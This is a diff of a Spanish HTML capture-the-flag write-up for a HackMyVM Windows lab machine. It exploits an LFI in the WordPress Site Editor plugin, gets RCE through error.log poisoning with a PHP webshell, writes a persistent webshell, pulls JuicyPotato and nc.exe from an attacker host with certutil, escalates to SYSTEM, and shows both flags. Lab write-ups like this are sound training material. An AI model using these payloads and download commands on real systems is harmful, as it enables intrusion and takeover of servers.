-<div class="code-body"><span class="comment"># nmap -p- --open -sSCV -n -vvv -A -T5 -oN TripAdvisor.txt 10.0.2.7</span>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>nmap — Full Scan</div>
+        <div class="code-body"><span class="comment"># nmap -p- --open -sSCV -n -vvv -A -T5 -oN TripAdvisor.txt 10.0.2.7</span>
 
 PORT     STATE SERVICE       VERSION
 <span class="highlight">445/tcp  open  microsoft-ds?</span>
@@ -223,44 +534,32 @@ PORT     STATE SERVICE       VERSION
 
 OS: Microsoft Windows Server 2008 R2 Enterprise
 MAC: 08:00:27:99:CE:BB (Oracle VirtualBox)</div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Entrada en /etc/hosts</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>/etc/hosts</div>
-<div class="code-body"><span class="ip">10.0.2.7</span> <span class="green">tripladvisor</span></div>
-</div>
-
-
-<p style="color:var(--text-dim);font-size:0.88rem;margin-top:10px">
+    <div class="card">
+      <h3>Entrada en /etc/hosts</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>/etc/hosts</div>
+        <div class="code-body"><span class="ip">10.0.2.7</span>  <span class="green">tripladvisor</span></div>
+      </div>
+      <p style="color:var(--text-dim);font-size:0.88rem;margin-top:10px">
         Necesaria ya que Apache redirige la raíz al dominio <code style="font-family:monospace;color:var(--cyan)">tripladvisor:8080/wordpress/</code>.
       </p>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Enumeración WordPress (WhatWeb + WPScan)</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>whatweb</div>
-<div class="code-body">http://tripladvisor:8080/wordpress/ [200 OK]
+    <div class="card">
+      <h3>Enumeración WordPress (WhatWeb + WPScan)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>whatweb</div>
+        <div class="code-body">http://tripladvisor:8080/wordpress/ [200 OK]
 Apache, Bootstrap[<span class="yellow">5.1.19</span>], WordPress,
 <span class="comment"><!-- Built With SiteEditor | http://www.siteeditor.org --></span>
 Title: <span class="green">TriplAdvisor – The best travel online guide!</span></div>
-</div>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>wpscan — Plugin Discovery</div>
-<div class="code-body"><span class="cmd">wpscan</span> <span class="param">--url</span> <span class="ip">http://tripladvisor:8080/wordpress/</span> <span class="param">--plugins-detection</span> aggressive
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>wpscan — Plugin Discovery</div>
+        <div class="code-body"><span class="cmd">wpscan</span> <span class="param">--url</span> <span class="ip">http://tripladvisor:8080/wordpress/</span> <span class="param">--plugins-detection</span> aggressive
 
 [+] WordPress version: <span class="yellow">5.1.19</span>
 [+] WordPress theme: <span class="highlight">Expert Adventure Guide v1.0</span>
@@ -272,96 +571,99 @@ Title: <span class="green">TriplAdvisor – The best travel online guide!</span>
     |     CVE: <span class="highlight">CVE-2018-7422</span>
 
 [+] Users: <span class="green">admin</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Explotación — LFI (CVE-2018-7422)</h2></div>
-      
+    <div class="callout callout-tip">
+      <strong>Nota de Enumeración:</strong> La ruta real del plugin en este servidor es
+      <code style="font-family:monospace">/wp-content/plugins/<strong>editor</strong>/</code> y no
+      <code style="font-family:monospace">/wp-content/plugins/site-editor/</code> como aparece en algunos writeups.
+      Se verificó con respuestas HTTP 404 vs 200.
+    </div>
+  </div>
 
+  <!-- SECCIÓN 3: LFI -->
+  <div class="section" id="lfi">
+    <div class="section-header">
+      <div class="section-number">3</div>
+      <h2>Explotación — LFI (CVE-2018-7422)</h2>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Descripción de la Vulnerabilidad</h2></div>
-      
-
-<p>
+    <div class="card">
+      <h3>Descripción de la Vulnerabilidad</h3>
+      <p>
         El plugin <strong>Site Editor v1.1.1</strong> incluye el archivo
         <code style="font-family:monospace;color:var(--cyan)">ajax_shortcode_pattern.php</code>
         que utiliza el parámetro GET <code style="font-family:monospace;color:var(--red)">ajax_path</code>
         como argumento de <code style="font-family:monospace;color:var(--yellow)">require_once()</code>
-<strong>sin ningún tipo de sanitización</strong>, permitiendo la inclusión de ficheros arbitrarios del sistema.
+        <strong>sin ningún tipo de sanitización</strong>, permitiendo la inclusión de ficheros arbitrarios del sistema.
       </p>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Código vulnerable — ajax_shortcode_pattern.php:5</div>
-<div class="code-body"><span class="comment">// Sin validación de ruta — vulnerable a LFI</span>
-if( isset( <span class="cyan">$_REQUEST['ajax_path']</span> ) &amp;&amp;
-    is_file( <span class="cyan">$_REQUEST['ajax_path']</span> ) &amp;&amp;
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Código vulnerable — ajax_shortcode_pattern.php:5</div>
+        <div class="code-body"><span class="comment">// Sin validación de ruta — vulnerable a LFI</span>
+if( isset( <span class="cyan">$_REQUEST['ajax_path']</span> ) &&
+    is_file( <span class="cyan">$_REQUEST['ajax_path']</span> ) &&
     file_exists( <span class="cyan">$_REQUEST['ajax_path']</span> ) ){
     <span class="highlight">require_once</span> <span class="cyan">$_REQUEST['ajax_path']</span>;
 }</div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Ruta Vulnerable Confirmada</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Verificación de paths — curl</div>
-<div class="code-body"><span class="comment"># Path incorrecto (404)</span>
+    <div class="card">
+      <h3>Ruta Vulnerable Confirmada</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Verificación de paths — curl</div>
+        <div class="code-body"><span class="comment"># Path incorrecto (404)</span>
 <span class="cmd">curl</span> -sk -o /dev/null -w "%{http_code}" \
   "http://tripladvisor:8080/wordpress/wp-content/plugins/<span class="red">site-editor</span>/editor/.../ajax_shortcode_pattern.php"
 <span class="muted">→ 404</span>
+
 <span class="comment"># Path correcto (200 ✓)</span>
 <span class="cmd">curl</span> -sk -o /dev/null -w "%{http_code}" \
   "http://tripladvisor:8080/wordpress/wp-content/plugins/<span class="green">editor</span>/editor/.../ajax_shortcode_pattern.php"
 <span class="green">→ 200</span></div>
-</div>
+      </div>
 
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>LFI — Lectura de hosts (PoC)</div>
-<div class="code-body">LFI_URL="http://tripladvisor:8080/wordpress/wp-content/plugins/<span class="green">editor</span>/editor/
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>LFI — Lectura de hosts (PoC)</div>
+        <div class="code-body">LFI_URL="http://tripladvisor:8080/wordpress/wp-content/plugins/<span class="green">editor</span>/editor/
 extensions/pagebuilder/includes/ajax_shortcode_pattern.php"
 
 <span class="cmd">curl</span> -sk "<span class="ip">${LFI_URL}</span><span class="param">?ajax_path=C:/Windows/System32/drivers/etc/hosts</span>"
 
 <span class="green">→ # Copyright (c) 1993-2009 Microsoft Corp.
   # This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>RCE vía Log Poisoning</h2></div>
-      
+    <div class="callout callout-info">
+      <strong>Formatos de ruta compatibles:</strong>
+      El parámetro <code style="font-family:monospace">ajax_path</code> acepta indistintamente barras
+      <code style="font-family:monospace">C:/Windows/…</code>, contrabarras
+      <code style="font-family:monospace">C:\Windows\…</code> y versiones URL-encoded
+      <code style="font-family:monospace">C%3A%5CWindows%5C…</code>.
+    </div>
+  </div>
 
+  <!-- SECCIÓN 4: RCE -->
+  <div class="section" id="rce">
+    <div class="section-header">
+      <div class="section-number">4</div>
+      <h2>RCE vía Log Poisoning</h2>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Estrategia: Error.log Poisoning</h2></div>
-      
-
-<p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
+    <div class="card">
+      <h3>Estrategia: Error.log Poisoning</h3>
+      <p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
         El <code style="font-family:monospace;color:var(--yellow)">access.log</code> de XAMPP contenía
         código PHP corrupto de intentos previos, causando un <code style="font-family:monospace;color:var(--red)">HTTP 500</code>
         al incluirlo. Se utilizó el <code style="font-family:monospace;color:var(--green)">error.log</code>
         como vector alternativo, inyectando PHP mediante una petición HTTP raw con un path inválido
         que Apache registra como error.
       </p>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Paso 1 — Inyección de webshell en error.log (raw socket)</div>
-<div class="code-body"><span class="comment"># Petición HTTP raw con PHP en el path — Apache lo registra en error.log</span>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Paso 1 — Inyección de webshell en error.log (raw socket)</div>
+        <div class="code-body"><span class="comment"># Petición HTTP raw con PHP en el path — Apache lo registra en error.log</span>
 import socket
 
 payload = <span class="yellow">"&lt;?php echo 'RCE_START'; echo shell_exec($_GET['cmd']); echo 'RCE_END'; ?&gt;"</span>
@@ -370,130 +672,107 @@ http_req = f"<span class="highlight">GET /wordpress/{payload} HTTP/1.1</span>\r\
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("<span class="ip">tripladvisor</span>", 8080))
 s.send(http_req.encode())  <span class="comment"># Apache registra el path en error.log</span></div>
-</div>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Paso 2 — Inclusión de error.log via LFI + ejecución</div>
-<div class="code-body"><span class="comment"># LFI incluye error.log → PHP ejecuta shell_exec($GET['cmd'])</span>
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Paso 2 — Inclusión de error.log via LFI + ejecución</div>
+        <div class="code-body"><span class="comment"># LFI incluye error.log → PHP ejecuta shell_exec($GET['cmd'])</span>
 GET <span class="path">/wordpress/wp-content/plugins/editor/.../ajax_shortcode_pattern.php</span>
-<span class="param">?ajax_path=C:/xampp/apache/logs/error.log</span>
-<span class="param">&amp;cmd=ipconfig</span>
+    <span class="param">?ajax_path=C:/xampp/apache/logs/error.log</span>
+    <span class="param">&amp;cmd=ipconfig</span>
+
 <span class="green">→ Windows IP Configuration
   IPv4 Address: 10.0.2.7
   Subnet Mask:  255.255.255.0</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Webshell Persistente en htdocs</h2></div>
-      
-
-<p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
+    <div class="card">
+      <h3>Webshell Persistente en htdocs</h3>
+      <p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
         Para mayor estabilidad, se escribió una webshell PHP limpia directamente en el directorio
         público de XAMPP usando el RCE obtenido.
       </p>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Escritura de webshell</div>
-<div class="code-body"><span class="comment"># Escribir shell limpia via RCE</span>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Escritura de webshell</div>
+        <div class="code-body"><span class="comment"># Escribir shell limpia via RCE</span>
 cmd=<span class="yellow">echo ^&lt;?php system($_GET[cmd]); ?^&gt; &gt; C:\xampp\htdocs\x.php</span>
+
 <span class="comment"># Verificación directa</span>
 <span class="cmd">curl</span> -sk "http://tripladvisor:8080/<span class="highlight">x.php</span><span class="param">?cmd=dir+C:\</span>"
 <span class="green">→ Volume in drive C has no label.
    Directory of C:\
    06/30/2024  inetpub | Program Files | Users | Windows | xampp</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Descarga de Herramientas via certutil</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Descarga de binarios al target</div>
-<div class="code-body"><span class="comment"># Servidor HTTP atacante</span>
+    <div class="card">
+      <h3>Descarga de Herramientas via certutil</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Descarga de binarios al target</div>
+        <div class="code-body"><span class="comment"># Servidor HTTP atacante</span>
 <span class="cmd">python3</span> -m http.server 8000  <span class="comment"># 10.0.2.4:8000</span>
+
 <span class="comment"># Descargar herramientas via webshell</span>
 cmd=certutil -urlcache -split -f <span class="ip">http://10.0.2.4:8000/</span><span class="highlight">JuicyPotato.exe</span> <span class="path">C:\Windows\Tasks\jp.exe</span>
-cmd=certutil -urlcache -split -f <span class="ip">http://10.0.2.4:8000/</span><span class="highlight">nc.exe</span> <span class="path">C:\Windows\Tasks\nc.exe</span>
-cmd=certutil -urlcache -split -f <span class="ip">http://10.0.2.4:8000/</span><span class="highlight">whoami.exe</span> <span class="path">C:\Windows\Tasks\whoami.exe</span>
+cmd=certutil -urlcache -split -f <span class="ip">http://10.0.2.4:8000/</span><span class="highlight">nc.exe</span>          <span class="path">C:\Windows\Tasks\nc.exe</span>
+cmd=certutil -urlcache -split -f <span class="ip">http://10.0.2.4:8000/</span><span class="highlight">whoami.exe</span>       <span class="path">C:\Windows\Tasks\whoami.exe</span>
+
 <span class="green">→ CertUtil: -URLCache command completed successfully.</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>User Flag Obtenida</h2></div>
-      
+    <div class="card">
+      <h3>User Flag Obtenida</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Lectura de user.txt</div>
+        <div class="code-body">cmd=type <span class="path">C:\Users\websvc\Desktop\user.txt</span>
 
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Lectura de user.txt</div>
-<div class="code-body">cmd=type <span class="path">C:\Users\websvc\Desktop\user.txt</span>
 <span class="green">→ 4159a2b3a38697518722695cbb09ee46</span>
 
 cmd=<span class="path">C:\Windows\Tasks\whoami.exe</span>
 <span class="green">→ TRIPLADVISOR\websvc</span></div>
-</div>
+      </div>
+      <div class="highlight-box">
+        <div style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--text-muted);margin-bottom:6px">USER FLAG</div>
+        <div class="val">4159a2b3a38697518722695cbb09ee46</div>
+      </div>
+    </div>
+  </div>
 
-
-<div class="highlight-box">
-<div style="font-size:11px;font-weight:700;text-transform:uppercase;color:var(--text-muted);margin-bottom:6px">USER FLAG</div>
-<div class="val">4159a2b3a38697518722695cbb09ee46</div>
-</div>
-
-
+  <!-- SECCIÓN 5: PRIVESC -->
+  <div class="section" id="privesc">
+    <div class="section-header">
+      <div class="section-number">5</div>
+      <h2>Escalada de Privilegios — JuicyPotato</h2>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Escalada de Privilegios — JuicyPotato</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Análisis de Privilegios — SeImpersonatePrivilege</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>whoami /priv — usuario websvc</div>
-<div class="code-body">cmd=<span class="path">C:\Windows\Tasks\whoami.exe</span> /priv
+    <div class="card">
+      <h3>Análisis de Privilegios — SeImpersonatePrivilege</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>whoami /priv — usuario websvc</div>
+        <div class="code-body">cmd=<span class="path">C:\Windows\Tasks\whoami.exe</span> /priv
 
 Privilege Name                 State
 <span class="highlight">SeImpersonatePrivilege</span>         = Impersonate a client after authentication  <span class="green">[ENABLED]</span>
 SeChangeNotifyPrivilege        = Bypass traverse checking                   [Enabled]
 SeCreateGlobalPrivilege        = Create global objects                      [Enabled]</div>
-</div>
-
-
-<div class="callout callout-danger">
-<strong>SeImpersonatePrivilege habilitado</strong> en Windows Server 2008 R2 — condición perfecta
+      </div>
+      <div class="callout callout-danger">
+        <strong>SeImpersonatePrivilege habilitado</strong> en Windows Server 2008 R2 — condición perfecta
         para <strong>JuicyPotato</strong>, que explota la interfaz COM <code style="font-family:monospace">ImpersonateNamedPipeClient</code>
         para crear un proceso bajo el token de <code style="font-family:monospace">NT AUTHORITY\SYSTEM</code>.
       </div>
-
-
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Ejecución de JuicyPotato</h2></div>
-      
-
-<p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
+    <div class="card">
+      <h3>Ejecución de JuicyPotato</h3>
+      <p style="color:var(--text-dim);font-size:0.88rem;margin-bottom:12px">
         CLSID válido para Windows Server 2008 R2:
         <code style="font-family:monospace;color:var(--yellow)">{659cdea7-489e-11d9-a9cd-000d56965251}</code>
-</p>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>JuicyPotato — Lectura directa de root.txt</div>
-<div class="code-body">cmd=<span class="path">C:\Windows\Tasks\jp.exe</span> \
+      </p>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>JuicyPotato — Lectura directa de root.txt</div>
+        <div class="code-body">cmd=<span class="path">C:\Windows\Tasks\jp.exe</span> \
   <span class="param">-l</span> 9002 \
   <span class="param">-c</span> <span class="yellow">{659cdea7-489e-11d9-a9cd-000d56965251}</span> \
   <span class="param">-p</span> <span class="path">cmd.exe</span> \
@@ -505,26 +784,20 @@ Testing {659cdea7-489e-11d9-a9cd-000d56965251} 9002
 [+] authresult 0
 {659cdea7-489e-11d9-a9cd-000d56965251};<span class="highlight">NT AUTHORITY\SYSTEM</span>
 [+] <span class="green">CreateProcessWithTokenW OK</span></div>
-</div>
-
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>Lectura del root.txt desde htdocs</div>
-<div class="code-body"><span class="cmd">curl</span> -sk "http://tripladvisor:8080/<span class="highlight">r.txt</span>"
+      </div>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>Lectura del root.txt desde htdocs</div>
+        <div class="code-body"><span class="cmd">curl</span> -sk "http://tripladvisor:8080/<span class="highlight">r.txt</span>"
 
 <span class="green">→ 5b38df6802c305e752c8f02358721acc</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Confirmación de NT AUTHORITY\SYSTEM</h2></div>
-      
-
-<div class="code-block">
-<div class="code-label"><span class="dot"></span>whoami /all — via JuicyPotato</div>
-<div class="code-body">cmd=<span class="path">C:\Windows\Tasks\jp.exe</span> -l 9003 -c {659cdea7-489e-11d9-a9cd-000d56965251} \
+    <div class="card">
+      <h3>Confirmación de NT AUTHORITY\SYSTEM</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="dot"></span>whoami /all — via JuicyPotato</div>
+        <div class="code-body">cmd=<span class="path">C:\Windows\Tasks\jp.exe</span> -l 9003 -c {659cdea7-489e-11d9-a9cd-000d56965251} \
   -p cmd.exe -a <span class="green">"/c C:\Windows\Tasks\whoami.exe /all &gt; C:\xampp\htdocs\w.txt"</span> -t *
 
 <span class="cmd">curl</span> -sk "http://tripladvisor:8080/w.txt"
@@ -538,211 +811,289 @@ Testing {659cdea7-489e-11d9-a9cd-000d56965251} 9002
 (X) <span class="highlight">SeDebugPrivilege</span>
 (X) <span class="highlight">SeImpersonatePrivilege</span>
 ... <span class="muted">(27 privilegios habilitados)</span></div>
-</div>
-
-
+      </div>
     </div>
 
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Mapeo MITRE ATT&CK</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Recomendaciones y Hardening</h2></div>
-      
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Detalles del Reto</h2></div>
-      
-
-<div class="detail-row">
-<span class="detail-key">Plataforma</span>
-<span class="detail-val green">HackMyVM</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">Nombre</span>
-<span class="detail-val">TriplAdvisor</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">Dificultad</span>
-<span class="detail-val green">Easy</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">OS</span>
-<span class="detail-val orange">Windows Server 2008 R2</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">IP</span>
-<span class="detail-val orange">10.0.2.7</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">CVE</span>
-<span class="detail-val red">CVE-2018-7422</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">User Flag</span>
-<span class="detail-val green">✓ Obtenida</span>
-</div>
-
-
-<div class="detail-row">
-<span class="detail-key">Root Flag</span>
-<span class="detail-val green">✓ Obtenida</span>
-</div>
-
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Habilidades Demostradas</h2></div>
-      
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">Web Enumeration</span><span class="skill-pct">95%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:95%"></div></div>
-</div>
-
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">LFI Exploitation</span><span class="skill-pct">90%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div>
-</div>
-
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">Log Poisoning → RCE</span><span class="skill-pct">88%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div>
-</div>
-
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">Privilege Escalation</span><span class="skill-pct">92%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div>
-</div>
-
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">Token Impersonation</span><span class="skill-pct">85%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:85%"></div></div>
-</div>
-
-
-<div class="skill-item">
-<div class="skill-header"><span class="skill-name">Windows Post-Exploit</span><span class="skill-pct">80%</span></div>
-<div class="skill-bar"><div class="skill-fill" style="width:80%"></div></div>
-</div>
-
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Herramientas y Artefactos</h2></div>
-      
-
-<div class="tool-list">
-<div class="tool-item"><span class="tool-icon">🔍</span><span><span class="tool-name">nmap</span> — Port &amp; service scan</span></div>
-<div class="tool-item"><span class="tool-icon">🔎</span><span><span class="tool-name">WhatWeb</span> — Tech fingerprinting</span></div>
-<div class="tool-item"><span class="tool-icon">🌐</span><span><span class="tool-name">WPScan</span> — WordPress enum</span></div>
-<div class="tool-item"><span class="tool-icon">💉</span><span><span class="tool-name">curl / Python</span> — LFI &amp; RCE</span></div>
-<div class="tool-item"><span class="tool-icon">🐚</span><span><span class="tool-name">msfvenom</span> — Payload gen</span></div>
-<div class="tool-item"><span class="tool-icon">📥</span><span><span class="tool-name">certutil</span> — LOLBin download</span></div>
-<div class="tool-item"><span class="tool-icon">🥔</span><span><span class="tool-name">JuicyPotato</span> — Token impersonation</span></div>
-<div class="tool-item"><span class="tool-icon">🖧</span><span><span class="tool-name">nc.exe</span> — Reverse shell</span></div>
-</div>
-
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>MITRE ATT&CK</h2></div>
-      
-
-<div class="mitre-list">
-<div class="mitre-item"><span class="mitre-id">T1595</span><span class="mitre-name">Active Scanning</span></div>
-<div class="mitre-item"><span class="mitre-id">T1190</span><span class="mitre-name">Exploit Public-Facing App</span></div>
-<div class="mitre-item"><span class="mitre-id">T1083</span><span class="mitre-name">File &amp; Directory Discovery</span></div>
-<div class="mitre-item"><span class="mitre-id">T1505.003</span><span class="mitre-name">Web Shell</span></div>
-<div class="mitre-item"><span class="mitre-id">T1027</span><span class="mitre-name">Obfuscated Files</span></div>
-<div class="mitre-item"><span class="mitre-id">T1105</span><span class="mitre-name">Ingress Tool Transfer</span></div>
-<div class="mitre-item"><span class="mitre-id">T1134.001</span><span class="mitre-name">Token Impersonation</span></div>
-<div class="mitre-item"><span class="mitre-id">T1548</span><span class="mitre-name">Abuse Elevation Mechanism</span></div>
-</div>
-
-
-    </div>
-
-    <div class="section">
-      <div class="section-header"><div class="section-icon"></div><h2>Índice de Contenido</h2></div>
-      
-
-<ul class="toc-list">
-<li><a href="#descripcion">① Descripción del Objetivo</a></li>
-<li><a href="#reconocimiento">② Reconocimiento y Enumeración</a></li>
-<li><a href="#lfi">③ LFI — CVE-2018-7422</a></li>
-<li><a href="#rce">④ RCE vía Log Poisoning</a></li>
-<li><a href="#privesc">⑤ Escalada de Privilegios</a></li>
-<li><a href="#mitre">⑥ Mapeo MITRE ATT&amp;CK</a></li>
-<li><a href="#hardening">⑦ Recomendaciones y Hardening</a></li>
-</ul>
-
-
-    </div>
-
-  </div>
-
-  <div class="sidebar">
-    <div class="sidebar-card">
-      <h3>Detalles del Reto</h3>
-      <div class="detail-row"><span class="detail-key">Dificultad</span><span class="detail-val green">EASY</span></div>
-      <div class="detail-row"><span class="detail-key">Sistema Operativo</span><span class="detail-val">Windows</span></div>
-      <div class="detail-row"><span class="detail-key">IP Target</span><span class="detail-val cyan">10.10.10.X</span></div>
-      <div class="detail-row"><span class="detail-key">Tipo</span><span class="detail-val">Machine</span></div>
-      <div class="detail-row"><span class="detail-key">Vectores</span><span class="detail-val">CVE-2018-7422, LFI</span></div>
-      <div class="detail-row"><span class="detail-key">CVE</span><span class="detail-val">CVE-2018-7422</span></div>
-    </div>
-    <div class="sidebar-card">
-      <h3>Skills Demostradas</h3>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">LFI</span><span class="skill-pct">92%</span></div><div class="skill-bar"><div class="skill-fill" style="width:92%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">Log Poisoning</span><span class="skill-pct">90%</span></div><div class="skill-bar"><div class="skill-fill" style="width:90%"></div></div></div>
-      <div class="skill-item"><div class="skill-header"><span class="skill-name">JuicyPotato</span><span class="skill-pct">88%</span></div><div class="skill-bar"><div class="skill-fill" style="width:88%"></div></div></div>
-    </div>
-    <div class="sidebar-card">
-      <h3>Herramientas</h3>
-      <div class="tools-list">
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">nmap</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">gobuster</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">wpscan</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">curl</span></div>
-        <div class="tool-item"><div class="tool-dot"></div><span class="tool-name">JuicyPotato</span></div>
+    <div class="flag-grid">
+      <div class="flag-card">
+        <div class="flag-card-label">🏴 User Flag</div>
+        <div class="flag-card-name">C:\Users\websvc\Desktop\user.txt</div>
+        <div class="flag-card-val">4159a2b3a38697518722695cbb09ee46</div>
+      </div>
+      <div class="flag-card">
+        <div class="flag-card-label">👑 Root Flag</div>
+        <div class="flag-card-name">C:\Users\Administrator\Desktop\root.txt</div>
+        <div class="flag-card-val">5b38df6802c305e752c8f02358721acc</div>
       </div>
     </div>
   </div>
-</div>
 
-<script>
-  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
-  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
-  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
-  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
-  setInterval(drawMatrix,35);
-</script>
+  <!-- SECCIÓN 6: MITRE ATT&CK -->
+  <div class="section" id="mitre">
+    <div class="section-header">
+      <div class="section-number">6</div>
+      <h2>Mapeo MITRE ATT&amp;CK</h2>
+    </div>
+
+    <div class="card">
+      <div class="mitre-table-wrap">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>ID</th>
+              <th>Técnica</th>
+              <th>Táctica</th>
+              <th>Descripción en esta máquina</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1595</span></td>
+              <td>Active Scanning</td>
+              <td><span class="badge badge-orange">Reconnaissance</span></td>
+              <td>nmap -p- con detección de servicios y OS fingerprinting</td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1190</span></td>
+              <td>Exploit Public-Facing Application</td>
+              <td><span class="badge badge-red">Initial Access</span></td>
+              <td>CVE-2018-7422 en Site Editor v1.1 — LFI via <code>ajax_path</code></td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1083</span></td>
+              <td>File and Directory Discovery</td>
+              <td><span class="badge badge-yellow">Discovery</span></td>
+              <td>LFI para leer <code>hosts</code>, <code>wp-config.php</code>, directorios de usuarios</td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1505.003</span></td>
+              <td>Web Shell</td>
+              <td><span class="badge badge-red">Persistence</span></td>
+              <td>PHP webshell escrita en <code>C:\xampp\htdocs\x.php</code></td>
+            </tr>
+            <tr>
+              <td><span class="badge badge-blue" style="font-family:monospace">T1027</span></td>
+              <td>Obfuscated Files or Information</td>
+              <td><span class="badge badge-purple">Defense Evasion</span></td>
+              <td>Log poisoning en error.log para evadir detección directa de webshell</td>
